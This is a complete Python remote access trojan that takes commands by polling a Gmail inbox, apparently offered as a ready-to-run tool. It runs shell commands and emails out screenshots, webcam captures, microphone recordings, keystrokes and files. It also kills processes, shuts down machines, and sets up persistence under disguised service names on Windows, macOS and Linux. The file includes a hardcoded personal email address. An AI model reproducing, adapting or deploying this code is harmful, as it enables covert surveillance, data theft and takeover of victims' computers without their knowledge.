import os
import base64
import subprocess
import time
import tempfile
import logging
import platform
import socket
import psutil
import json
import shutil
import requests
from datetime import datetime
from threading import Thread
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('remote_control.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

CONFIG = {
    'email': 'seyedhojjathosseini@gmail.com',  
    'check_interval': 15,  
    'max_attachment_size': 25 * 1024 * 1024,  
    'timeout_command': 60,  
    'token_path': 'token.json'  
}

class RemoteController:
    def __init__(self):
        self.initialize_gmail_service()
        self.commands = {
            'exec': self.execute_command,
            'screenshot': self.capture_screenshot,
            'upload': self.upload_file,
            'download': self.download_file,
            'sysinfo': self.get_system_info,
            'help': self.show_help,
            'processes': self.list_processes,
            'kill': self.kill_process,
            'webcam': self.capture_webcam,
            'audio': self.record_audio,
            'browse': self.list_directory,
            'keylog': self.toggle_keylogger,
            'networks': self.list_networks,
            'location': self.get_location,
            'shutdown': self.shutdown_system,
            'restart': self.restart_system,
            'persist': self.setup_persistence,
        }
        self.keylogger_active = False
        self.keylogger_thread = None

    def initialize_gmail_service(self):
        """Initialize the Gmail API service"""
        try:
            if not os.path.exists(CONFIG['token_path']):
                logger.error(f"Token file not found: {CONFIG['token_path']}")
                raise FileNotFoundError(f"Token file not found: {CONFIG['token_path']}")
                
            self.creds = Credentials.from_authorized_user_file(
                CONFIG['token_path'], 
                ['https://www.googleapis.com/auth/gmail.modify']
            )
            self.service = build('gmail', 'v1', credentials=self.creds)
            logger.info("Gmail service initialized successfully")
        except Exception as e:
            logger.error(f"Failed to initialize Gmail service: {e}")
            raise

    def create_message(self, subject, body, attachments=None):
        """Create an email message with optional attachments"""
        message = MIMEMultipart()
        message['to'] = CONFIG['email']
        message['subject'] = subject
        message.attach(MIMEText(body, 'plain'))

        if attachments:
            if not isinstance(attachments, list):
                attachments = [attachments]
                
            for filepath in attachments:
                if os.path.exists(filepath):
                    attachment_size = os.path.getsize(filepath)
                    if attachment_size > CONFIG['max_attachment_size']:
                        logger.warning(f"Attachment too large: {filepath} ({attachment_size} bytes)")
                        continue
                        
                    try:
                        with open(filepath, 'rb') as f:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(f.read())
                            encoders.encode_base64(part)
                            part.add_header('Content-Disposition', 
                                          f'attachment; filename="{os.path.basename(filepath)}"')
                            message.attach(part)
                    except Exception as e:
                        logger.error(f"Failed to attach file {filepath}: {e}")

        raw = base64.urlsafe_b64encode(message.as_bytes()).decode()
        return {'raw': raw}

    def send_email(self, subject, body, attachments=None):
        """Send an email via Gmail API"""
        try:
            message = self.create_message(subject, body, attachments)
            self.service.users().messages().send(userId='me', body=message).execute()
            logger.info(f"Email sent: {subject}")
            return True
        except Exception as e:
            logger.error(f"Failed to send email: {e}")
            return False

    def get_email_body(self, msg):
        """Extract the body text from an email message"""
        try:
            parts = msg.get('payload', {}).get('parts')
            if parts:
                for part in parts:
                    if part.get('mimeType') == 'text/plain':
                        data = part['body'].get('data')
                        if data:
                            return base64.urlsafe_b64decode(data).decode('utf-8', errors='replace')
                            
            # fallback if no parts
            body = msg.get('payload', {}).get('body', {}).get('data')
            if body:
                return base64.urlsafe_b64decode(body).decode('utf-8', errors='replace')
            return ""
        except Exception as e:
            logger.error(f"Failed to parse email body: {e}")
            return ""

    def extract_attachment(self, message, dest_dir=None):
        """Extract attachments from a message and save them"""
        if not dest_dir:
            dest_dir = tempfile.gettempdir()
            
        saved_files = []
        
        try:
            payload = message.get('payload', {})
            parts = payload.get('parts', [])
            
            if not parts:
                return saved_files
                
            for part in parts:
                if part.get('filename'):
                    filename = part['filename']
                    if not filename:
                        continue
                        
                    body = part.get('body', {})
                    attachment_id = body.get('attachmentId')
                    
                    if attachment_id:
                        attachment = self.service.users().messages().attachments().get(
                            userId='me', 
                            messageId=message['id'], 
                            id=attachment_id
                        ).execute()
                        
                        data = attachment.get('data')
                        if data:
                            file_data = base64.urlsafe_b64decode(data)
                            filepath = os.path.join(dest_dir, filename)
                            
                            with open(filepath, 'wb') as f:
                                f.write(file_data)
                                
                            saved_files.append(filepath)
                            logger.info(f"Saved attachment: {filepath}")
                    
            return saved_files
        except Exception as e:
            logger.error(f"Failed to extract attachments: {e}")
            return saved_files

    def execute_command(self, command):
        """Execute a shell command and return the output"""
        try:
            output = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT, 
                timeout=CONFIG['timeout_command']
            )
            return output.decode('utf-8', errors='replace')
        except subprocess.TimeoutExpired:
            return "Error: Command execution timed out."
        except Exception as e:
            return f"Error: {str(e)}"

    def capture_screenshot(self, args=None):
        """Capture a screenshot and send it via email"""
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            temp_path = os.path.join(tempfile.gettempdir(), f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
            img.save(temp_path)
            
            self.send_email(
                subject="Screenshot Captured", 
                body=f"Screenshot taken at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                attachments=temp_path
            )
            
            os.remove(temp_path)
            return "Screenshot captured and sent."
        except Exception as e:
            logger.error(f"Failed to capture screenshot: {e}")
            return f"Failed to capture screenshot: {str(e)}"

    def upload_file(self, path):
        """Upload a file from the local system via email"""
        path = path.strip()
        if not os.path.exists(path):
            return f"Error: File not found: {path}"
            
        try:
            file_size = os.path.getsize(path)
            if file_size > CONFIG['max_attachment_size']:
                return f"Error: File too large ({file_size} bytes)"
                
            self.send_email(
                subject=f"File Upload: {os.path.basename(path)}", 
                body=f"Uploaded file from path: {path}\nSize: {file_size} bytes", 
                attachments=path
            )
            return f"File uploaded: {path}"
        except Exception as e:
            logger.error(f"Failed to upload file {path}: {e}")
            return f"Error uploading file: {str(e)}"

    def download_file(self, args):
        """Download attached files from recent emails with a specific subject"""
        search_term = args.strip() if args else "download"
        
        try:
            results = self.service.users().messages().list(
                userId='me', 
                q=f"subject:{search_term} has:attachment"
            ).execute()
            
            messages = results.get('messages', [])
            if not messages:
                return "No emails with attachments found matching the search criteria."
                
            latest_msg = messages[0]
            msg_data = self.service.users().messages().get(
                userId='me', 
                id=latest_msg['id'], 
                format='full'
            ).execute()
            
            download_dir = os.path.join(os.getcwd(), "downloads")
            os.makedirs(download_dir, exist_ok=True)
            
            saved_files = self.extract_attachment(msg_data, download_dir)
            
            if saved_files:
                return f"Downloaded {len(saved_files)} files to {download_dir}:\n" + "\n".join(saved_files)
            else:
                return "No attachments found or could be downloaded."
        except Exception as e:
            logger.error(f"Failed to download files: {e}")
            return f"Error downloading files: {str(e)}"

    def get_system_info(self, args=None):
        """Get detailed system information"""
        try:
            system_info = {
                "System": {
                    "Platform": platform.system(),
                    "Release": platform.release(),
                    "Version": platform.version(),
                    "Architecture": platform.machine(),
                    "Processor": platform.processor(),
                    "Hostname": platform.node(),
                    "Username": os.getlogin()
                },
                "CPU": {
                    "Cores (Physical)": psutil.cpu_count(logical=False),
                    "Cores (Logical)": psutil.cpu_count(),
                    "Usage (%)": psutil.cpu_percent(interval=1)
                },
                "Memory": {
                    "Total (GB)": round(psutil.virtual_memory().total / (1024**3), 2),
                    "Available (GB)": round(psutil.virtual_memory().available / (1024**3), 2),
                    "Used (%)": psutil.virtual_memory().percent
                },
                "Disk": {}
            }
            
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    system_info["Disk"][partition.mountpoint] = {
                        "Total (GB)": round(usage.total / (1024**3), 2),
                        "Free (GB)": round(usage.free / (1024**3), 2),
                        "Used (%)": usage.percent
                    }
                except:
                    pass
            
            network_info = {}
            for interface_name, interface_addresses in psutil.net_if_addrs().items():
                addresses = []
                for address in interface_addresses:
                    if address.family == socket.AF_INET:
                        addresses.append(f"IPv4: {address.address}")
                    elif address.family == socket.AF_INET6:
                        addresses.append(f"IPv6: {address.address}")
                if addresses:
                    network_info[interface_name] = addresses
                    
            system_info["Network Interfaces"] = network_info
            
            info_text = json.dumps(system_info, indent=4)
            
            self.send_email(
                subject="System Information", 
                body=info_text
            )
            
            return "System information gathered and sent."
        except Exception as e:
            logger.error(f"Failed to gather system info: {e}")
            return f"Error gathering system information: {str(e)}"

    def show_help(self, args=None):
        """Show available commands and their usage"""
        help_text = "Available Commands:\n\n"
        
        command_docs = {
            'exec [command]': 'Execute a shell command',
            'screenshot': 'Capture a screenshot',
            'upload [path]': 'Upload a file from the system',
            'download [search_term]': 'Download attachment from email with subject containing [search_term]',
            'sysinfo': 'Get detailed system information',
            'processes': 'List running processes',
            'kill [pid/name]': 'Kill a process by PID or name',
            'webcam': 'Capture an image from webcam',
            'audio [seconds]': 'Record audio for specified seconds',
            'browse [path]': 'List files in directory (defaults to current)',
            'keylog [start/stop]': 'Start or stop keylogger',
            'networks': 'List available WiFi networks',
            'location': 'Get approximate location based on IP',
            'shutdown': 'Shutdown the system',
            'restart': 'Restart the system',
            'persist': 'Setup persistence mechanism',
            'help': 'Show this help message'
        }
        
        for cmd, desc in command_docs.items():
            help_text += f"{cmd}: {desc}\n"
            
        self.send_email(subject="Command Help", body=help_text)
        return "Help information sent."

    def list_processes(self, args=None):
        """List running processes with CPU and memory usage"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'status']):
                try:
                    process_info = proc.info
                    process_info['cpu_percent'] = proc.cpu_percent()
                    process_info['memory_percent'] = round(proc.memory_percent(), 2)
                    processes.append(process_info)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
                    
            processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
            
            report = "PID\tCPU%\tMEM%\tSTATUS\tNAME\n"
            report += "-" * 60 + "\n"
            
            for proc in processes[:50]:  
                report += f"{proc['pid']}\t{proc['cpu_percent']}\t{proc['memory_percent']}\t{proc['status']}\t{proc['name']}\n"
                
            self.send_email(subject="Running Processes", body=report)
            return "Process list sent."
        except Exception as e:
            logger.error(f"Failed to list processes: {e}")
            return f"Error listing processes: {str(e)}"

    def kill_process(self, process_identifier):
        """Kill a process by PID or name"""
        if not process_identifier:
            return "Error: No PID or process name provided."
            
        try:
            if process_identifier.isdigit():
                pid = int(process_identifier)
                process = psutil.Process(pid)
                process_name = process.name()
                process.terminate()
                return f"Process terminated: PID {pid} ({process_name})"
            else:
                killed = []
                for proc in psutil.process_iter(['pid', 'name']):
                    if process_identifier.lower() in proc.info['name'].lower():
                        proc.terminate()
                        killed.append(f"PID {proc.info['pid']} ({proc.info['name']})")
                        
                if killed:
                    return f"Processes terminated:\n" + "\n".join(killed)
                else:
                    return f"No processes found matching: {process_identifier}"
        except psutil.NoSuchProcess:
            return f"Error: Process with PID {process_identifier} not found"
        except psutil.AccessDenied:
            return f"Error: Access denied when trying to terminate process"
        except Exception as e:
            logger.error(f"Failed to kill process {process_identifier}: {e}")
            return f"Error: {str(e)}"

    def capture_webcam(self, args=None):
        """Capture an image from webcam"""
        try:
            import cv2
            
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return "Error: Could not access webcam."
                
            ret, frame = cap.read()
            if not ret:
                return "Error: Could not capture image from webcam."
                

            temp_path = os.path.join(tempfile.gettempdir(), f'webcam_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg')
            cv2.imwrite(temp_path, frame)
            cap.release()
            

            self.send_email(
                subject="Webcam Capture", 
                body=f"Webcam image captured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                attachments=temp_path
            )
            
            os.remove(temp_path)
            return "Webcam image captured and sent."
        except ImportError:
            return "Error: OpenCV library is not installed. Install with 'pip install opencv-python'"
        except Exception as e:
            logger.error(f"Failed to capture webcam: {e}")
            return f"Error capturing webcam: {str(e)}"

    def record_audio(self, seconds_str="5"):
        """Record audio from microphone for specified seconds"""
        try:
            import pyaudio
            import wave
            

            try:
                seconds = int(seconds_str.strip())
                if seconds < 1 or seconds > 60:
                    seconds = 5  
            except:
                seconds = 5  
                
            format = pyaudio.paInt16
            channels = 1
            rate = 44100
            chunk = 1024
            
            audio = pyaudio.PyAudio()
            
            stream = audio.open(
                format=format,
                channels=channels,
                rate=rate,
                input=True,
                frames_per_buffer=chunk
            )
            
            frames = []
            for i in range(0, int(rate / chunk * seconds)):
                data = stream.read(chunk)
                frames.append(data)
                
            stream.stop_stream()
            stream.close()
            audio.terminate()
            
            temp_path = os.path.join(tempfile.gettempdir(), f'audio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.wav')
            
            with wave.open(temp_path, 'wb') as wf:
                wf.setnchannels(channels)
                wf.setsampwidth(audio.get_sample_size(format))
                wf.setframerate(rate)
                wf.writeframes(b''.join(frames))
                
            self.send_email(
                subject=f"Audio Recording ({seconds}s)", 
                body=f"Audio recorded at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} for {seconds} seconds",
                attachments=temp_path
            )
            
            os.remove(temp_path)
            return f"Audio recorded for {seconds} seconds and sent."
        except ImportError:
            return "Error: PyAudio library is not installed. Install with 'pip install pyaudio'"
        except Exception as e:
            logger.error(f"Failed to record audio: {e}")
            return f"Error recording audio: {str(e)}"

    def list_directory(self, path=None):
        """List files and directories at the specified path"""
        try:
            if not path or not path.strip():
                path = os.getcwd()
            else:
                path = path.strip()
                
            if not os.path.exists(path):
                return f"Error: Path not found: {path}"
                
            if not os.path.isdir(path):
                return f"Error: Not a directory: {path}"
                
            items = []
            with os.scandir(path) as entries:
                for entry in entries:
                    try:
                        stats = entry.stat()
                        size = stats.st_size
                        modified = datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                        type_marker = 'D' if entry.is_dir() else 'F'
                        items.append({
                            'name': entry.name,
                            'type': type_marker,
                            'size': size,
                            'modified': modified
                        })
                    except:
                        items.append({
                            'name': entry.name,
                            'type': '?',
                            'size': 0,
                            'modified': 'N/A'
                        })
                        
            items.sort(key=lambda x: (x['type'] != 'D', x['name'].lower()))
            
            report = f"Directory listing for: {path}\n"
            report += f"Total items: {len(items)}\n\n"
            report += "TYPE\tSIZE\t\tMODIFIED\t\tNAME\n"
            report += "-" * 80 + "\n"
            
            for item in items:
                if item['type'] == 'D':
                    size_str = "<DIR>"
                elif item['size'] < 1024:
                    size_str = f"{item['size']} B"
                elif item['size'] < 1024**2:
                    size_str = f"{item['size'] / 1024:.1f} KB"
                elif item['size'] < 1024**3:
                    size_str = f"{item['size'] / (1024**2):.1f} MB"
                else:
                    size_str = f"{item['size'] / (1024**3):.1f} GB"
                    
                report += f"{item['type']}\t{size_str.ljust(8)}\t{item['modified']}\t{item['name']}\n"
                
            self.send_email(subject=f"Directory Listing: {os.path.basename(path)}", body=report)
            return f"Directory listing sent for: {path}"
        except Exception as e:
            logger.error(f"Failed to list directory {path}: {e}")
            return f"Error listing directory: {str(e)}"

    def start_keylogger(self):
        """Thread function for keylogger"""
        try:
            from pynput import keyboard
            
            temp_path = os.path.join(tempfile.gettempdir(), 'keylogs.txt')
            
            def on_press(key):
                if not self.keylogger_active:
                    return False  
                    
                try:
                    key_str = str(key.char)
                except AttributeError:
                    key_str = f'[{str(key)}]'
                    
                with open(temp_path, 'a', encoding='utf-8') as f:
                    f.write(key_str)
                    
                if os.path.exists(temp_path) and os.path.getsize(temp_path) > 100:
                    with open(temp_path, 'r', encoding='utf-8') as f:
                        key_data = f.read()
                        
                    self.send_email(
                        subject="Keylogger Data", 
                        body=f"Captured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}:\n\n{key_data}"
                    )
                    
                    open(temp_path, 'w').close()
                
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
                
        except ImportError:
            logger.error("Keylogger failed: pynput not installed")
        except Exception as e:
            logger.error(f"Keylogger failed: {e}")

    def toggle_keylogger(self, command=None):
        """Start or stop the keylogger"""
        if command and command.strip().lower() == "stop":
            self.keylogger_active = False
            return "Keylogger stopped."
            
        try:
            import pynput
            
            if self.keylogger_active:
                self.keylogger_active = False
                return "Keylogger already running. Stopping now."
                
            self.keylogger_active = True
            self.keylogger_thread = Thread(target=self.start_keylogger)
            self.keylogger_thread.daemon = True
            self.keylogger_thread.start()
            
            return "Keylogger started."
        except ImportError:
            return "Error: pynput library is not installed. Install with 'pip install pynput'"
        except Exception as e:
            logger.error(f"Failed to toggle keylogger: {e}")
            return f"Error toggling keylogger: {str(e)}"

    def list_networks(self, args=None):
        """List available WiFi networks"""
        try:
            if platform.system() == "Windows":
                networks = subprocess.check_output(
                    "netsh wlan show networks mode=bssid", 
                    shell=True
                ).decode('utf-8', errors='ignore')
                
            elif platform.system() == "Darwin":
                networks = subprocess.check_output(
                    "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s", 
                    shell=True
                ).decode('utf-8', errors='ignore')
                
            elif platform.system() == "Linux":
                networks = subprocess.check_output(
                    "nmcli dev wifi list", 
                    shell=True
                ).decode('utf-8', errors='ignore')
                
            else:
                return "Error: Unsupported operating system"
                
            self.send_email(subject="WiFi Networks", body=networks)
            return "WiFi network list sent."
        except Exception as e:
            logger.error(f"Failed to list networks: {e}")
            return f"Error listing networks: {str(e)}"

    def get_location(self, args=None):
        """Get approximate location based on IP address"""
        try:
            response = requests.get('https://ipinfo.io/json')
            if response.status_code == 200:
                data = response.json()
                location_info = f"""
IP Location Information:
------------------------
IP: {data.get('ip', 'N/A')}
City: {data.get('city', 'N/A')}
Region: {data.get('region', 'N/A')}
Country: {data.get('country', 'N/A')}
Location: {data.get('loc', 'N/A')}
Organization: {data.get('org', 'N/A')}
Postal: {data.get('postal', 'N/A')}
Timezone: {data.get('timezone', 'N/A')}
                """
                
                self.send_email(subject="IP Location Information", body=location_info)
                return "Location information sent."
            else:
                return "Error: Could not retrieve location information."
        except Exception as e:
            logger.error(f"Failed to get location: {e}")
            return f"Error getting location: {str(e)}"

    def shutdown_system(self, args=None):
        """Shutdown the system"""
        try:
            self.send_email(subject="System Shutdown", body=f"Shutdown initiated at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            if platform.system() == "Windows":
                os.system("shutdown /s /t 10")
            elif platform.system() == "Darwin":  # macOS
                os.system("sudo shutdown -h +1")
            elif platform.system() == "Linux":
                os.system("sudo shutdown -h +1")
                
            return "System shutdown initiated."
        except Exception as e:
            logger.error(f"Failed to shutdown system: {e}")
            return f"Error shutting down system: {str(e)}"

    def restart_system(self, args=None):
        """Restart the system"""
        try:
            self.send_email(subject="System Restart", body=f"Restart initiated at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            if platform.system() == "Windows":
                os.system("shutdown /r /t 10")
            elif platform.system() == "Darwin":  # macOS
                os.system("sudo shutdown -r +1")
            elif platform.system() == "Linux":
                os.system("sudo shutdown -r +1")
                
            return "System restart initiated."
        except Exception as e:
            logger.error(f"Failed to restart system: {e}")
            return f"Error restarting system: {str(e)}"

    def setup_persistence(self, args=None):
        """Setup persistence mechanism for autostart"""
        try:
            script_path = os.path.abspath(__file__)
            
            if platform.system() == "Windows":
                startup_path = os.path.join(
                    os.getenv('APPDATA'), 
                    'Microsoft', 
                    'Windows', 
                    'Start Menu', 
                    'Programs', 
                    'Startup'
                )
                
                shortcut_path = os.path.join(startup_path, 'SystemService.lnk')
                
                with open(shortcut_path, 'w') as f:
                    f.write(f'@echo off\npythonw.exe "{script_path}"')
                    
                os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "SystemService" /t REG_SZ /d "pythonw.exe {script_path}" /f')
                
                return "Persistence setup completed on Windows."
                
            elif platform.system() == "Darwin":  # macOS
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
                
                plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.service.plist")
                
                with open(plist_path, 'w') as f:
                    f.write(plist_content)
                    
                os.system(f"chmod 644 {plist_path}")
                os.system(f"launchctl load {plist_path}")
                
                return "Persistence setup completed on macOS."
                
            elif platform.system() == "Linux":
                service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {script_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target"""
                
                service_path = os.path.expanduser("~/.config/systemd/user/system-service.service")
                os.makedirs(os.path.dirname(service_path), exist_ok=True)
                
                with open(service_path, 'w') as f:
                    f.write(service_content)
                    
                os.system("systemctl --user enable system-service.service")
                os.system("systemctl --user start system-service.service")
                
                return "Persistence setup completed on Linux."
            else:
                return "Error: Unsupported operating system"
                
        except Exception as e:
            logger.error(f"Failed to setup persistence: {e}")
            return f"Error setting up persistence: {str(e)}"

    def process_command(self, command_text, subject):
        """Process command from email body"""
        logger.info(f"Processing command: {command_text}")
        
        command_parts = command_text.strip().split(' ', 1)
        command = command_parts[0].lower()
        args = command_parts[1] if len(command_parts) > 1 else None
        
        if command in self.commands:
            result = self.commands[command](args)
            self.send_email(
                subject=f"Command Result: {command}",
                body=f"Command: {command_text}\n\nResult:\n{result}"
            )
        else:
            self.send_email(
                subject="Unknown Command",
                body=f"Command not recognized: {command_text}\n\nType 'help' for available commands."
            )

    def check_for_commands(self):
        """Check for new command emails"""
        try:
            results = self.service.users().messages().list(userId='me', q='is:unread').execute()
            messages = results.get('messages', [])
            
            if not messages:
                return
                
            for msg in messages:
                try:
                    msg_data = self.service.users().messages().get(userId='me', id=msg['id'], format='full').execute()
                    
                    headers = msg_data['payload'].get('headers', [])
                    from_email = ''
                    subject = ''
                    
                    for h in headers:
                        if h['name'] == 'From':
                            from_email = h['value']
                        elif h['name'] == 'Subject':
                            subject = h['value']
                    
                    if CONFIG['email'] not in from_email:
                        self.service.users().messages().modify(
                            userId='me', 
                            id=msg['id'], 
                            body={'removeLabelIds': ['UNREAD']}
                        ).execute()
                        continue
                        
                    body = self.get_email_body(msg_data).strip()
                    
                    if body:
                        self.process_command(body, subject)
                    
                    self.service.users().messages().modify(
                        userId='me', 
                        id=msg['id'], 
                        body={'removeLabelIds': ['UNREAD']}
                    ).execute()
                    
                except Exception as e:
                    logger.error(f"Error processing message {msg['id']}: {e}")
                    
        except Exception as e:
            logger.error(f"Error checking for commands: {e}")

    def run(self):
        """Run the main loop"""
        logger.info("Starting remote control system...")
        
        system_info = {
            "System": platform.system(),
            "Hostname": platform.node(),
            "Username": os.getlogin(),
            "IP": self.get_ip_address(),
            "Start Time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        info_text = "Remote Control System Started\n\n"
        for key, value in system_info.items():
            info_text += f"{key}: {value}\n"
            
        self.send_email(
            subject="Remote Control System Started", 
            body=info_text
        )
        

        while True:
            try:
                self.check_for_commands()
            except Exception as e:
                logger.error(f"Error in main loop: {e}")
                
            time.sleep(CONFIG['check_interval'])
    
    def get_ip_address(self):
        """Get public IP address"""
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            try:
                response = requests.get('https://ifconfig.me/ip', timeout=5)
                return response.text
            except:
                return "Unknown"


def main():
    """Main function"""
    try:
        controller = RemoteController()
        controller.run()
    except Exception as e:
        logger.critical(f"Critical error: {e}")
        
        if "token" in str(e).lower():
            logger.info("Token error detected. Attempting to reconnect...")
            time.sleep(60)  
            main()  
            

if __name__ == '__main__':
    main()